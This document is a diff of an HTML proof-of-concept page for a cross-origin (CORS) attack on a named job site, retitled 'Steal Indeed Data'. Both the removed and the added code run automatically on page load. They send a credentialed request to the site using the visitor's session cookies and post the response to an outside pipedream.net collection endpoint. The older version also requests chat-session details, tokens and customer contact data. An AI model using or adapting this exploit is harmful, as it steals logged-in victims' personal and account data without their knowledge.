@@ -1,37 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC - CORS Exploit</title>
-    <script>
-        function exfiltrateData() {
-            var url = 'https://profile.indeed.com'; // Target
-            var method = 'POST';
-            var xhr = new XMLHttpRequest();
-
-            xhr.open(method, url, true);
-            xhr.withCredentials = true; // Crucial for sending cookies/auth
-
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            "stolenData": xhr.responseText
-                        })
-                    });
-                }
-            };
-
-            var payload = '{"operationName":"GetCurrentCustomerSession","variables":{},"query":"query GetCurrentCustomerSession {\n  getCurrentCustomerSession {\n    chatSession {\n      ...FragmentChatSession\n      __typename\n    }\n    enableRating\n    xmppUser {\n      id\n      username\n      token\n      host\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment FragmentChatSession on ChatSession {\n  id\n  sessionId\n  userCustomer {\n    id\n    name\n    email\n    phoneNumber\n    gender\n    userType {\n      type\n      __typename\n    }\n    comment\n    commentedBy {\n      name\n      __typename\n    }\n    __typename\n  }\n  userBCA {\n    username\n    name\n    __typename\n  }\n  chatType {\n    typeName\n    __typename\n  }\n  chatReason {\n    reasonName\n    __typename\n  }\n  sessionSentiment {\n    sentimentType\n    __typename\n  }\n  skill {\n    name\n    published\n    __typename\n  }\n  sessionCategories {\n    categoryName\n    __typename\n  }    }\n}"}';
-
-            xhr.send(payload);
-        }
-
-        window.onload = exfiltrateData;
-    </script>
+    <title>Steal Indeed Data</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://profile.indeed.com", true);
+        xhr.withCredentials = true;  // Include victim's session cookies
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ data: xhr.responseText })
+                });
+            }
+        };
+
+        xhr.send();
+    </script>
 </body>
 </html>
